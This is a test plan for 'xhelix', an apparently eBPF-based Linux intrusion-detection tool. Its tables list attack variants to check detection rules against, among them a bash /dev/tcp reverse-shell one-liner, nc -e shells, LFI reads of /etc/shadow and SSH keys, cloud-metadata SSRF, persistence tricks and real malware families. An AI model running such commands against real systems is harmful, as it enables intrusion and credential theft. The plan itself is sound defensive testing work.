# xhelix — End-to-End Test Plan (Phase 2 → Production-Ready)

**Owner**: ftahirops
**Started**: 2026-05-21
**Status**: planning
**Scope**: bring xhelix from late-alpha to a state where enabling
enforcement on a busy production-like host is defensible.

This plan is a **living document**. Every test row has a `Status`
column: `pending | running | pass | fail | blocked | regress`. Each
row updates with run-date, evidence pointer, rule that fired,
score, FP/TP verdict. We do not move a test from `pending → pass`
without an evidence artefact on disk (`evidence_id` column).

Companion docs:
- `PHASE_1_RESULTS.md` — frozen first-phase verdict
- `DETECTION_GAPS.md` — known ways detection fails today
- `REMOTE_ATTACK.md` — operator runbook
- `run_remote_suite.sh` — phase driver

---

## 0. Goals & exit criteria

**Exit criteria for "ready for production":**

1. ≥ 90% of `T1*` MITRE techniques in the attack matrix below have at
   least one variant detected with a known rule + evidence.
2. < 2 false-positive class incidents per 24h on a busy reference
   workstation (node, java, python, docker, snapd, systemd).
3. Response engine has been run in enforce mode on the reference
   workstation for 7 days without SIGSTOPping a legitimate workload.
4. Every `ActionQuarantine | ActionKill` rule entry has a documented
   exemption rationale OR a test asserting it doesn't fire on
   legitimate runtimes.
5. Evidence chain verifies clean after a 7-day continuous run.
6. `xhelixctl events tail` works end-to-end.
7. Container escape detection has at least one validated PoC per
   primitive (cap_sys_admin, /proc bind, /var/run/docker.sock,
   release_agent, mount over /).
8. Auth detection: SSH brute, PAM bypass, sudo abuse, LD_PRELOAD
   PAM bypass each produce alerts.

**Definition of done per test**: result + evidence_id + rule_id +
detection_latency_ms recorded in this file. Failures get an entry in
`DETECTION_GAPS.md` with root cause and remediation plan.

---

## 1. Test environment & safe-execution methodology

### 1.1 Two-machine topology

```
ATTACKER (135.181.79.13)              VICTIM (135.181.79.27)
- builds & launches exploits          - runs xhelix monitor mode
- hosts staged payloads :9001         - vuln targets behind nginx
- receives reverse shells :9999       - egress allowlist:
- hosts fake c2 :9002                   only sinkhole + attacker IP
                                      - DNS = local stub (no resolv)
```

iptables: only `135.181.79.13` reaches victim on 80/443. Other rules
untouched.

### 1.2 Sandbox / containment for **real** malware

Real malware execution must NOT happen on the production-adjacent host.
Three rings of isolation are required before any sample runs:

**Ring A — disposable VM**:
- KVM/QEMU VM, ephemeral disk, no shared mount with host
- VLAN-isolated network: only egress to attacker box (acts as fake C2 +
  sinkhole)
- Snapshot before each sample; revert after.
- `/var/lib/xhelix` rsynced out before revert.

**Ring B — within-VM container**:
- rootless podman / docker, no `--privileged`, drop ALL caps except
  the minimum the sample needs.
- read-only rootfs, tmpfs `/tmp` capped at 256MB.
- seccomp profile allows execve but blocks `init_module`, `kexec_load`,
  `setns`, `unshare(CLONE_NEWUSER)`, `mount`.
- network namespace bridged to a sinkhole interface only.

**Ring C — destructive-action firebreaks** within the container:
- prepend `LD_PRELOAD=/usr/lib/xhe-shim.so` (writes-block shim for
  `/etc/`, `/root/`, `/home/`, `/boot/`).
- mount-bind read-only over `/etc/cron*`, `/etc/systemd`,
  `/etc/ld.so.preload`, `/lib/security`, `/usr/lib*/security`.
- inotify watcher on those paths fails-fast if a write lands.

**xhelix runs on the VM host AND inside the VM**, comparing detections.
Host xhelix sees the eBPF events from VM workloads if KSM/cgroup
tracking is set up; in-VM xhelix is the primary record.

### 1.3 Sources of real samples

For each source, retain the SHA-256 in the test row.

| Source | What | How to fetch | Caveats |
|---|---|---|---|
| MalwareBazaar (abuse.ch) | binaries, scripts, droppers | API + auth-key | EULA |
| theZoo (Yuval Nativ) | classic Linux malware corpus | git clone, password-protected zips | older samples |
| vx-underground | curated samples | tor + magnet | manual review |
| ExploitDB | RCE / LPE PoCs | git submodule | per-license |
| Metasploit `exploit/linux/*` | productionised exploits | `msfconsole` | safe-by-default payloads |
| GitHub PoC repos | CVE-specific | search & clone | quality varies |
| Atomic Red Team | technique-level scripts | upstream repo | benign, MITRE-tagged |

Atomic Red Team is **required** baseline coverage — it's MITRE-mapped
and runs without needing actual malware. Real malware is the gold
standard but Atomic provides the breadth.

---

## 2. Master test execution tracker

Legend: `[ ]`=pending  `[~]`=running  `[P]`=pass  `[F]`=fail  `[B]`=blocked  `[R]`=regression

Per row: ID | Technique | Variant | Expected rule(s) | Status | Evidence ID | Latency | Notes

---

## 3. Detection test matrix

### 3.1 Memory-class attacks (T1055, T1620, T1027)

Why this category matters most: in-memory primitives are the gateway to
everything else. If xhelix misses RWX or memfd_exec, every later phase
loses correlation context.

| ID | Variant | Tool/PoC | Expected | Status | Notes |
|---|---|---|---|---|---|
| M-01 | anonymous RWX mmap | `tests/redteam/poc/mmap_rwx.c` | `mem_mprotect_rwx` (post-fix: alert only) | [ ] | |
| M-02 | W→X mprotect transition | `tests/redteam/poc/mprotect_wx.c` | `mem_mprotect_rwx` | [ ] | |
| M-03 | memfd_create + execve | `tests/redteam/poc/memfd_exec.c` | `memfd_run_pattern` | [ ] | |
| M-04 | ptrace PTRACE_ATTACH | `tests/redteam/poc/ptrace_attach.c` | `ptrace_sensitive_target` | [ ] | |
| M-05 | process_vm_readv cross-PID read | `tests/redteam/poc/process_vm_readv_poc.c` | NeverLearnable signal | [ ] | |
| M-06 | process_vm_writev injection | (to write) | NeverLearnable + planner score bump | [ ] | |
| M-07 | bpf() syscall from non-allowlist | (to write — load tiny BPF prog) | `bpf_syscall_unexpected` | [ ] | |
| M-08 | userfaultfd from unpriv | (to write) | mem.* | [ ] | requires kernel cfg |
| M-09 | /proc/self/mem self-patch | (to write) | mem.* | [ ] | |
| M-10 | ROP chain trigger | EXPLOIT-DB sample | mem.* + crashloop | [ ] | needs binary w/ known gadgets |
| M-11 | classic stack BOF + shellcode | (to write — `-fno-stack-protector -no-pie -z execstack`) | `mem_mprotect_rwx` + cap.gained | [ ] | ASLR fingerprint test |
| M-12 | heap UAF → controlled write | (to write) | `mem_canary_fail` (if canary present) | [ ] | |
| M-13 | format-string %n write | (to write) | none directly; cascades via exec | [ ] | low-yield |
| M-14 | LD_PRELOAD shellcode loader | (to write) | `ld_so_preload_modified` + memfd | [ ] | dual-class |
| M-15 | bpf_probe / BPF rootkit attempt | (to write) | bpf rootkit + cap.gained | [ ] | high-FP risk |
| M-16 | JIT side-channel (V8 fake)  | run `node -e ...` | should NOT fire post-fix | [ ] | **FP test** — must alert-only |
| M-17 | Real Linux Cobalt-Strike-ish beacon | real sample, Ring A | mem.* + outbound + cooccur | [ ] | real malware, see §1.2 |
| M-18 | Sliver implant (Linux) | sliver build | beacon + memfd | [ ] | real malware, see §1.2 |

### 3.2 Process exec, fileless, LOLBin (T1059, T1218, T1574, T1620)

| ID | Variant | PoC | Expected | Status |
|---|---|---|---|---|
| P-01 | `/proc/self/fd/N` execve (memfd) | covered M-03 | `memfd_run_pattern` | [ ] |
| P-02 | `/dev/shm/x` exec | bash script | `binary_runs_from_tmp` | [ ] |
| P-03 | `/tmp/x` exec | bash script | `binary_runs_from_tmp` | [ ] |
| P-04 | base64 decode → pipe to sh | curl one-liner | cooccur (encoded + exec) | [ ] |
| P-05 | python -c inline exec | curl one-liner | proc + interpreter | [ ] |
| P-06 | perl -e inline | curl one-liner | proc + interpreter | [ ] |
| P-07 | ruby -e inline | curl one-liner | proc + interpreter | [ ] |
| P-08 | awk system() call | bash one-liner | proc indirect | [ ] |
| P-09 | LOLBin: `gtfobins` /usr/bin/find -exec sh | sudoer test | sudo-abuse rule | [ ] |
| P-10 | LOLBin: `vim :!sh` | interactive | shell-spawn rule | [ ] |
| P-11 | LOLBin: `less !sh` | interactive | shell-spawn rule | [ ] |
| P-12 | LOLBin: env -i sh | bash one-liner | proc + uid0_no_transition | [ ] |
| P-13 | shell with stdin=socket | nc reverse-shell | `shell_with_socket_fd` ✅ (verified phase-1) | [ ] |
| P-14 | shell with stdout=socket | bash `>/dev/tcp` | `shell_with_socket_fd` | [ ] |
| P-15 | docker exec from compromised host | docker socket | container-escape rule | [ ] |
| P-16 | Web RCE → sh (Flask vuln-app) | curl `/exec?cmd=` | `web_server_spawns_shell` | [ ] |
| P-17 | Web RCE → memfd stage | curl chained | cooccur download+execute | [ ] |

### 3.3 Persistence (T1543, T1547, T1098, T1037, T1574)

| ID | Variant | PoC | Expected | Status |
|---|---|---|---|---|
| PS-01 | append to `/root/.ssh/authorized_keys` | rce_cmd | `ssh_key_added_root` + FIM | [ ] |
| PS-02 | drop `/etc/cron.d/x` | rce_cmd | `cron_new_unit` + FIM | [ ] |
| PS-03 | drop `/etc/cron.daily/x` | rce_cmd | FIM | [ ] |
| PS-04 | modify `/etc/crontab` | rce_cmd | FIM `tamper_*` | [ ] |
| PS-05 | drop systemd unit `/etc/systemd/system/evil.service` | rce_cmd | `systemd_unit_added` + FIM | [ ] |
| PS-06 | drop systemd timer | rce_cmd | FIM | [ ] |
| PS-07 | append `/etc/ld.so.preload` | rce_cmd | `ld_so_preload_modified` ✅ remediator | [ ] |
| PS-08 | drop pam_unix.so replacement | rce_cmd | `pam_module_drop` | [ ] |
| PS-09 | modify `/etc/passwd` (uid 0 user) | rce_cmd | `tamper_passwd` remediator | [ ] |
| PS-10 | modify `/etc/shadow` | rce_cmd | `tamper_shadow` remediator | [ ] |
| PS-11 | drop `/etc/sudoers.d/evil` | rce_cmd | FIM | [ ] |
| PS-12 | drop `~/.bashrc` shell hook | rce_cmd | FIM (currently NOT watched) | [ ] |
| PS-13 | drop `/etc/profile.d/evil.sh` | rce_cmd | FIM (not watched) — **gap** | [ ] |
| PS-14 | drop `/etc/rc.local` line | rce_cmd | FIM (depends on distro) | [ ] |
| PS-15 | SUID copy `/bin/sh` → `/tmp/.x` | rce_cmd + `chmod 4755` | suid_baseline diff | [ ] |
| PS-16 | xattrs (capabilities) on copied bin | `setcap cap_setuid+ep` | LSM xattr / cap.gained | [ ] |
| PS-17 | kernel module insert (real LKM .ko) | needs Ring A | `modules_changed` + cap.gained | [ ] |
| PS-18 | BPF persistent program (pinned) | bpftool | bpf rootkit cooccur | [ ] |
| PS-19 | LD_AUDIT instead of LD_PRELOAD | bash setenv | currently NOT detected — **gap** | [ ] |
| PS-20 | Container-escape persistence: write to host /etc via /proc/1/root | (in Ring B) | container-escape rule | [ ] |

### 3.4 Credential theft (T1003, T1552, T1555, T1083)

| ID | Variant | PoC | Expected | Status |
|---|---|---|---|---|
| C-01 | read `/etc/shadow` | curl LFI | tamper.read (FIM read-tap) | [ ] |
| C-02 | read `/root/.ssh/id_rsa` | curl LFI | LFI rule | [ ] |
| C-03 | read `/proc/<pid>/environ` for cred env vars | bash | LFI / proc-walk | [ ] |
| C-04 | read AWS metadata 169.254.169.254 | curl SSRF | `metadata_svc_unexpected` | [ ] |
| C-05 | read GCP metadata | curl SSRF | metadata rule | [ ] |
| C-06 | read instance-identity token | SSRF chain | metadata + cooccur | [ ] |
| C-07 | dump browser-stored creds (Chrome json) | bash | file-read pattern | [ ] |
| C-08 | scan `/home/*/.docker/config.json` | bash | LFI pattern | [ ] |
| C-09 | scan `/home/*/.aws/credentials` | bash | LFI pattern | [ ] |
| C-10 | scan `/home/*/.kube/config` | bash | LFI pattern | [ ] |
| C-11 | dump from running ssh-agent socket | nc /tmp/ssh-* | not detected today — **gap** | [ ] |
| C-12 | read GPG agent socket | bash | gap | [ ] |
| C-13 | extract creds from systemd-creds | systemd-creds list | gap | [ ] |
| C-14 | LSASS-equivalent: process_vm_readv from auth proc | tied to M-05 | NeverLearnable | [ ] |
| C-15 | dump keyrings via keyctl | bash | gap | [ ] |
| C-16 | mimipenguin port (real tool) | real | proc-walk + LFI cooccur | [ ] |

### 3.5 Reverse shells & C2 (T1071, T1572, T1059)

| ID | Variant | PoC | Expected | Status |
|---|---|---|---|---|
| RS-01 | `bash -i >& /dev/tcp/$IP/9999 0>&1` | one-liner | `shell_with_socket_fd` ✅ | [ ] |
| RS-02 | bash `exec 5<>/dev/tcp/...` | one-liner | `shell_with_socket_fd` | [ ] |
| RS-03 | nc -e | one-liner | shell-with-socket | [ ] |
| RS-04 | ncat --ssl reverse | one-liner | TLS SNI + shell | [ ] |
| RS-05 | python pty reverse | one-liner | shell-with-socket | [ ] |
| RS-06 | perl reverse | one-liner | shell-with-socket | [ ] |
| RS-07 | socat reverse | one-liner | shell-with-socket | [ ] |
| RS-08 | meterpreter reverse_tcp | msfvenom | full takeover cooccur | [ ] |
| RS-09 | sliver implant beacon | sliver | beacon + memfd | [ ] |
| RS-10 | DNS over HTTPS C2 | curl DoH | DGA/DoH detection — **partial** | [ ] |
| RS-11 | C2 over WebSocket | python sample | not detected — **gap** | [ ] |
| RS-12 | C2 over ICMP tunnel | needs raw socket | gap | [ ] |
| RS-13 | C2 over QUIC | needs library | gap | [ ] |
| RS-14 | low-and-slow beacon (60min interval) | python | `beacon.periodic_callback` (over time) | [ ] |
| RS-15 | jitter+sleep C2 | sample | beacon rule | [ ] |

### 3.6 Exfiltration & DNS tunneling (T1041, T1048, T1071.004)

| ID | Variant | PoC | Expected | Status |
|---|---|---|---|---|
| E-01 | base64 of `/etc/passwd` over HTTP POST | curl | DLCF taint + egress valve | [ ] |
| E-02 | gzip+base64 stream over POST | curl | egress + size anomaly | [ ] |
| E-03 | DNS TXT lookup tunnel (5 chunks) | nslookup loop | `netids.dga` + `dnsexfil.tunnel_pattern` | [ ] |
| E-04 | DNS over hex labels | bash | tunnel pattern | [ ] |
| E-05 | ICMP payload tunnel | hping3 | gap | [ ] |
| E-06 | exfil to S3 endpoint via cred | aws cli | metadata + outbound | [ ] |
| E-07 | exfil to webhook (discord, telegram) | curl | known-bad intel feed | [ ] |
| E-08 | upload via legitimate paste service (pastebin) | curl | egress + intel | [ ] |
| E-09 | exfil via SMTP | nc 25 | gap unless egress valve | [ ] |
| E-10 | exfil via cloud sync (rclone) | rclone | gap | [ ] |

### 3.7 Container & VM escape (T1611, T1610)

Run inside Ring B containers. Expected: xhelix on the host sees the
escape attempt.

| ID | Variant | PoC | Expected | Status |
|---|---|---|---|---|
| CE-01 | `cap_sys_admin` + mount /proc/1/root | docker run --cap-add SYS_ADMIN | container-escape rule | [ ] |
| CE-02 | `/var/run/docker.sock` from container | bind mount | docker.sock access rule — gap | [ ] |
| CE-03 | release_agent on cgroup v1 | exploit script | LSM + write to release_agent | [ ] |
| CE-04 | core_pattern abuse (cgroupfs) | exploit | tamper.core_pattern | [ ] |
| CE-05 | `kexec_load` syscall | C poc | NeverLearnable | [ ] |
| CE-06 | `init_module` via real .ko | C poc | `modules_changed` | [ ] |
| CE-07 | unshare(CLONE_NEWUSER) priv esc | unshare + nsenter | namespace anomaly — gap | [ ] |
| CE-08 | overlayfs rw layer write to host | mount manip | LSM + FIM | [ ] |
| CE-09 | proc rootfs walk (`/proc/1/root/etc`) | bash | proc-walk pattern — gap | [ ] |
| CE-10 | seccomp bypass via ptrace | C poc | ptrace rule | [ ] |
| CE-11 | LXC unprivileged escape | sample | gap | [ ] |
| CE-12 | runc CVE-2019-5736 style overwrite | well-known PoC | tamper + cap | [ ] |
| CE-13 | DirtyCow / DirtyPipe / Dirty Cred class | published PoC | LSM + cap | [ ] |
| CE-14 | eBPF helper abuse to bypass LSM | sample | bpf rootkit cooccur | [ ] |

### 3.8 Public-facing app exploits (T1190)

Run against vuln-app, plus drop real vulnerable services in Ring A.

| ID | Variant | Target | Expected | Status |
|---|---|---|---|---|
| EX-01 | Flask intentional RCE (`/exec?cmd=`) | our vuln-app | `web_server_spawns_shell` | [ ] |
| EX-02 | Flask path traversal (`/read?path=`) | our vuln-app | LFI rule | [ ] |
| EX-03 | Flask python eval (`/eval?expr=`) | our vuln-app | proc + interpreter | [ ] |
| EX-04 | Log4Shell PoC (real JNDI lookup) | Tomcat sample app | outbound + LDAP cooccur | [ ] |
| EX-05 | Spring4Shell | sample | proc + writes | [ ] |
| EX-06 | Struts S2-* | sample | proc + ognl | [ ] |
| EX-07 | Confluence CVE-2022-26134 | sample | proc | [ ] |
| EX-08 | GoAhead env injection | sample | proc | [ ] |
| EX-09 | PHP-FPM RCE chain | sample | proc | [ ] |
| EX-10 | WordPress arbitrary file upload + shell | wp + wpscan | upload + shell-spawn | [ ] |
| EX-11 | phpMyAdmin RCE | sample | proc | [ ] |
| EX-12 | Drupalgeddon variants | sample | proc | [ ] |
| EX-13 | Jenkins script console RCE | sample | proc | [ ] |
| EX-14 | GitLab CVE chain | sample | proc | [ ] |
| EX-15 | Apache CVE-2021-41773 path traversal | sample | LFI | [ ] |

### 3.9 SSRF + cloud metadata (T1090, T1071, T1213)

| ID | Variant | PoC | Expected | Status |
|---|---|---|---|---|
| SS-01 | AWS imds v1 unauth | curl SSRF | `metadata_svc_unexpected` ✅ designed | [ ] |
| SS-02 | AWS imds v2 (PUT-token bypass) | curl SSRF | metadata rule | [ ] |
| SS-03 | GCP metadata.google.internal | curl SSRF | metadata rule | [ ] |
| SS-04 | Azure 169.254.169.254 + Metadata header | curl SSRF | metadata rule | [ ] |
| SS-05 | k8s API 169.254.169.254 | curl SSRF | metadata rule | [ ] |
| SS-06 | localhost-only services exposed | curl SSRF | outbound from web-proc | [ ] |
| SS-07 | redis on 127.0.0.1:6379 | curl gopher | gap unless service-aware | [ ] |
| SS-08 | file:// scheme | curl SSRF | LFI rule via interpreter | [ ] |

### 3.10 Defense evasion (T1562, T1014, T1027, T1070)

| ID | Variant | PoC | Expected | Status |
|---|---|---|---|---|
| D-01 | `systemctl stop xhelix` | bash | tamper.systemd + watchdog | [ ] |
| D-02 | `kill -9` xhelix pid | bash | watchdog re-arm | [ ] |
| D-03 | corrupt `/var/lib/xhelix/chain` | bash | tamper.chain | [ ] |
| D-04 | append fake entries to alerts.jsonl | bash | log-tamper detection — gap | [ ] |
| D-05 | rm `/var/log/auth.log` | bash | tamper.auditd_dead | [ ] |
| D-06 | AppArmor disable (`aa-disable`) | bash | LSM posture change | [ ] |
| D-07 | seccomp escape via prctl | C poc | gap | [ ] |
| D-08 | timestomp on dropped binary | touch -t | binary_mtime | [ ] |
| D-09 | shred -uz `/tmp/payload` | bash | RecursiveDelete signal | [ ] |
| D-10 | history clear (`history -c`, `unset HISTFILE`) | bash | identity tamper | [ ] |
| D-11 | wipe `/root/.bash_history` | bash | FIM | [ ] |
| D-12 | mount tmpfs over `/var/log` to lose logs | bash | mount + tamper | [ ] |
| D-13 | drop iptables rules | iptables -F | network posture change | [ ] |
| D-14 | masquerade binary name (`./busybox sh` as `nginx`) | bash | proc name vs path mismatch | [ ] |
| D-15 | packed/UPX-compressed binary | upx | binary entropy + unpack-at-runtime | [ ] |

---

## 4. Authentication & login attack testing (T1110, T1078, T1098, T1556)

Critical because P-B.0a (WebAuthn), P-B.0b (admin IP allow-list), and
SSH brute detection are wired. Variants must exercise each path.

| ID | Variant | Tool | Expected | Status |
|---|---|---|---|---|
| AU-01 | SSH password brute force (10 attempts/sec) | hydra / patator | `ssh_brute_then_success` + ip lockout | [ ] |
| AU-02 | SSH single-attempt valid login from new IP | ssh from new ASN | identity.sshd new-asn alert | [ ] |
| AU-03 | SSH valid login from known-bad ASN | TOR exit | netids.bad + identity | [ ] |
| AU-04 | SSH key re-use across hosts (replay-resistant nonces) | manual | P-B.2 replay nonce alert | [ ] |
| AU-05 | PAM bypass via faketime + cached password | sample | identity.pam fail-then-pass | [ ] |
| AU-06 | LD_PRELOAD-based PAM bypass | shared object | `pam_module_drop` + ld_preload | [ ] |
| AU-07 | sudo NOPASSWD scanning (`sudo -l`) | bash | sudo enumeration — partial gap | [ ] |
| AU-08 | sudo escalation via gtfobins | `sudo find -exec sh` | sudo-abuse rule | [ ] |
| AU-09 | su to root from low-priv account | su - root | uid0 transition + identity | [ ] |
| AU-10 | systemd-run --uid 0 | bash | uid0_no_transition | [ ] |
| AU-11 | WebAuthn replay (P-B.0a) | replay captured assertion | webauthn.replay | [ ] |
| AU-12 | WebAuthn assertion forgery | manual | webauthn.verify-fail | [ ] |
| AU-13 | Admin route access from non-allowed IP (P-B.0b) | curl | admin.ip-disallowed | [ ] |
| AU-14 | Canary user logged in (P-B.1) | ssh canary@ | `canary_user_login` | [ ] |
| AU-15 | Canary route hit (P-B.1) | curl /admin/decoy | canary route fire | [ ] |
| AU-16 | TOTP replay (within window) | manual | gap unless wired | [ ] |
| AU-17 | Session-token theft + reuse from new device | manual | passive device fp — gap (P-B.0c) | [ ] |
| AU-18 | cookie hijack via XSS-stolen | manual | dependent on app | [ ] |
| AU-19 | SAML/OIDC token forgery | manual | gap | [ ] |
| AU-20 | Kerberos ticket abuse (if AD) | sample | gap | [ ] |
| AU-21 | LDAP injection auth bypass | curl | proc + outbound | [ ] |
| AU-22 | Lateral SSH from compromised box | post-exploit | egress + new-asn | [ ] |
| AU-23 | service-account token stuffing | curl | rate spike + reqcontract | [ ] |
| AU-24 | OAuth refresh-token theft + reuse | manual | gap | [ ] |
| AU-25 | API-key replay from compromised CI | manual | reqcontract divergence | [ ] |

---

## 5. Deception layer testing (Ring 2)

For each layer, fire its trigger and confirm it captured the attacker
into evidence, NOT just logged.

| ID | Layer | Trigger | Expected | Status |
|---|---|---|---|---|
| DE-01 | sinkhole HTTP | outbound to known-bad host | `/var/lib/xhelix/forensic/sinkhole.jsonl` row | [ ] |
| DE-02 | sinkhole TLS | TLS handshake to sinkhole port | sinkhole.jsonl row + cert fp | [ ] |
| DE-03 | sinkhole raw TCP | nc to redirected port | sinkhole.jsonl row | [ ] |
| DE-04 | dnspoison known-bad | resolve flagged domain | dnspoison.jsonl + planner signal | [ ] |
| DE-05 | dnspoison DGA pattern | random domains | dga rule + dnspoison | [ ] |
| DE-06 | honey-sh fake-exec redirect | nginx-test gets shell | session in forensic + cooccur | [ ] |
| DE-07 | honey-sh `id`, `whoami`, `uname` | inside session | per-command event in chain | [ ] |
| DE-08 | honey-sh `curl evil.com` | inside session | IOC extraction (URL kind) | [ ] |
| DE-09 | honey-sh AKIA token paste | inside session | ChmodExec / cred_exfil_chain | [ ] |
| DE-10 | honey-sh latency budget | spam 100 cmds | enforce MaxCommands + MaxDuration | [ ] |
| DE-11 | decoy-fs read of `/var/lib/decoy/credentials.json` | open() | `decoy_file_opened` | [ ] |
| DE-12 | decoy service connect on port 9999 | nc | `decoy_service_connect` | [ ] |
| DE-13 | decoy canary token used in HTTP header | curl with token | `decoy_canary_token_used` | [ ] |
| DE-14 | tc redirect from real ingress (Phase-2 wiring) | external curl to redirected port | sinkhole sees it | [ ] |
| DE-15 | crash-loop trap (service oom 5x in 30s) | systemctl restart loop | crashloop alert | [ ] |
| DE-16 | crashloop ExemptSignals=SIGKILL FP test | OOM-killed worker | should NOT alert | [ ] |

---

## 6. Response engine — TP + FP testing

This is the most under-tested area and the one that hurt us in Phase 1.

### 6.1 True-positive: each ActionQuarantine entry must actually quarantine the right thing

| ID | Rule | Trigger | Expected action | FP risk |
|---|---|---|---|---|
| R-01 | `shell_with_socket_fd` | bash `>/dev/tcp` | Snapshot + Quarantine | medium |
| R-02 | `web_server_spawns_shell` | Flask `/exec` | Snapshot + Quarantine | medium |
| R-03 | `uid0_no_transition` | systemd-run --uid 0 from non-root | Snapshot + Quarantine | low |
| R-04 | `ptrace_sensitive_target` | ptrace bash from sudo | Snapshot + Quarantine | medium |
| R-05 | `decoy_file_opened` | open /var/lib/decoy/x | Quarantine | low |
| R-06 | `decoy_service_connect` | nc decoy port | NetBan | low |
| R-07 | `decoy_canary_token_used` | curl with canary | NetBan | low |
| R-08 | `bpf_syscall_unexpected` | unexpected bpf() | Quarantine | high (CI tools) |
| R-09 | `mem_canary_fail` | canary corruption | Snapshot + MemScan + Quarantine | high (legit faults?) |
| R-10 | `mem_lkrg_violation` | LKRG check fails | Snapshot + MemScan + Quarantine | medium |
| R-11 | `outbound_to_known_bad` | curl Spamhaus DROP | NetBan | low |
| R-12 | `tamper_passwd` | append /etc/passwd | Remediate | high (legit useradd?) |
| R-13 | `tamper_shadow` | edit /etc/shadow | Remediate | high (legit passwd cmd?) |
| R-14 | `ld_so_preload_modified` | echo to ld.so.preload | Remediate | high (legit pkg install?) |
| R-15 | `pam_module_drop` | drop pam_unix.so | Remediate | medium |
| R-16 | `ssh_key_added_root` | append authorized_keys | Remediate | medium |
| R-17 | `ssh_brute_then_success` | hydra + final success | NetBan + LockUser | low |
| R-18 | `beacon.periodic_callback` | python beacon every 60s | Snapshot + NetBan | medium |

### 6.2 False-positive corpus (MUST be tested before enforce mode)

For each, the rule must alert ONLY OR not fire at all.

| ID | Workload | Likely to trip | Acceptable outcome |
|---|---|---|---|
| FP-01 | `node -e 'process.exit(0)'` | mem_mprotect_rwx | alert-only ✅ post P-PS.23 |
| FP-02 | `node` running a real webapp for 60s | mem_mprotect_rwx + memfd | alert-only |
| FP-03 | OpenJDK / HotSpot start | mem_mprotect_rwx | alert-only |
| FP-04 | dotnet run | mem_mprotect_rwx | alert-only |
| FP-05 | `python -c 'import torch'` | mem_mprotect_rwx via libtorch | alert-only |
| FP-06 | `python -m venv` | binary_runs_from_tmp (no), memfd (no) | clean |
| FP-07 | `docker run alpine sh` | shell_with_socket_fd risk if attached | alert-only |
| FP-08 | `kubectl exec` | proc + shell | alert-only |
| FP-09 | systemd unit reload | tamper.systemd | clean |
| FP-10 | apt-get install pkg with maintainer scripts | binary_runs_from_tmp / ld_preload | clean |
| FP-11 | snap refresh | mount + binary_runs | clean |
| FP-12 | Buildkite / GitHub Actions runner | memfd | alert-only |
| FP-13 | Ansible playbook run | proc + sudo + shell | alert-only |
| FP-14 | CI/CD pipeline `git clone` + `make build` | proc | clean |
| FP-15 | `useradd alice` | tamper_passwd | **must NOT trigger Remediate** — this is currently dangerous |
| FP-16 | `passwd alice` | tamper_shadow | must NOT Remediate |
| FP-17 | normal cron job daily | cron_new_unit | clean if pre-existing |

Each FP test gets a 60-min run that verifies no `response: quarantined`,
`response: killed`, or `response: remediated` line in xhelix.out.

### 6.3 Soak gate

| ID | Test | Expected |
|---|---|---|
| SG-01 | Brand-new rule, day 0, fires | gated to Log only despite mask saying Quarantine |
| SG-02 | Rule day SoakDays+1 with no FP | full action mask honored |
| SG-03 | Rule fires FP, operator marks it, gate re-locks | back to Log only |

### 6.4 PanicSwitch

| ID | Test | Expected |
|---|---|---|
| PS-01 | Operator engages PanicSwitch | all actions deferred, logging continues |
| PS-02 | PanicSwitch + new attack | event recorded, no destructive action |
| PS-03 | PanicSwitch disengage | actions resume |

---

## 7. Evidence chain testing

| ID | Test | Expected |
|---|---|---|
| EV-01 | Generate 100 alerts, run `xhelix-verify --chain dir --pub key` | clean |
| EV-02 | Corrupt 1 byte in a batch, verify | identifies tampered batch # exactly |
| EV-03 | Truncate the chain | identifies missing-tail |
| EV-04 | Forge a batch with wrong signature | rejected |
| EV-05 | Replay an old batch | sequence break detected |
| EV-06 | 7-day continuous run | verifier still clean |
| EV-07 | Mid-run xhelix crash (SIGKILL) and resume | chain continues, no gap |
| EV-08 | Rotate chain.key, verify with old + new pubs | both verify their slices |

## 8. Hot/cold store testing

| ID | Test | Expected |
|---|---|---|
| ST-01 | 24h continuous run, monitor `du -sh /var/lib/xhelix/` | < 2 GB total |
| ST-02 | Force-fill hot.db to limit, verify pruner kicks in | size returns to baseline |
| ST-03 | Cold-store day-partition retention | old partitions dropped |
| ST-04 | Power-cut simulation (qemu killswitch) | SQLite recovers, no corruption |
| ST-05 | `xhelixctl events tail` | returns events (today: stub) — **must implement** |

## 9. Performance / soak

| ID | Test | Pass criterion |
|---|---|---|
| PF-01 | 10k events/sec sustained for 10min | < 5% CPU, < 200MB RSS |
| PF-02 | 100k events/sec burst | no drop > 0.1% |
| PF-03 | eBPF ringbuf overflow scenario | drop counter increments, no crash |
| PF-04 | 7-day soak on idle workstation | no growth in any goroutine, no fd leak |
| PF-05 | 7-day soak on busy workstation (node+docker+CI) | no SIGSTOP, no remediate, no host-quarantine |

## 10. Real malware lab — execution plan

Pick 8 samples for first round, all Linux ELF:

| ID | Family | Behavior | Source | Detection target |
|---|---|---|---|---|
| MW-01 | Sliver (red-team C2) | beacon + memfd | open-source build | beacon + memfd |
| MW-02 | Cobalt-Strike-like (BRC4 Linux, if found) | beacon + injection | research sample | full cooccur |
| MW-03 | Mirai variant (IoT) | scan + brute + drop | abuse.ch | brute + outbound |
| MW-04 | XMRig drop chain | crypto-miner persist | abuse.ch | cron persist + outbound |
| MW-05 | TeamTNT (k8s/docker) | container escape + cred theft | known sample | container-escape |
| MW-06 | Kinsing / cryptojacker | shell + tor | known | proc + outbound |
| MW-07 | XorDDoS | LKM rootkit | older sample | modules + outbound |
| MW-08 | BPFdoor (BPF backdoor) | bpf socket filter trick | research | bpf rootkit cooccur |

Procedure per sample:
1. Snapshot Ring A VM.
2. Download SHA-256-verified sample to VM via attacker.
3. Mark `===MW-XX_BEGIN_<ts>===` in xhelix log.
4. Execute sample with bounded time (5 min).
5. Mark `===MW-XX_END_<ts>===`.
6. `xhelixctl forensic iocs` + `grep` log between markers.
7. Score: which rules fired, which expected ones missed, FP on host.
8. Restore VM snapshot.

A miss is the most valuable signal. Each miss goes into `DETECTION_GAPS.md`
with the sample's behavior and what's needed to detect it.

## 11. CI integration

| ID | Job | Trigger |
|---|---|---|
| CI-01 | `make vet && make test -race` | every PR |
| CI-02 | `make build && make static-check` | every PR |
| CI-03 | Atomic Red Team (Linux subset) on PR-branch xhelix | nightly |
| CI-04 | FP corpus run (§6.2) | nightly |
| CI-05 | 24h soak on a reference workstation | weekly |
| CI-06 | Evidence-chain verify after CI-05 | weekly |
| CI-07 | Real-malware lab subset (3 samples) | weekly, manual gate |

---

## 12. Status dashboard

Update after each test run.

| Category | Total | Pass | Fail | Pending | Gap |
|---|---|---|---|---|---|
| Memory (M-*)            | 18 | 0 | 0 | 18 | — |
| Process exec (P-*)      | 17 | 1 | 0 | 16 | — |
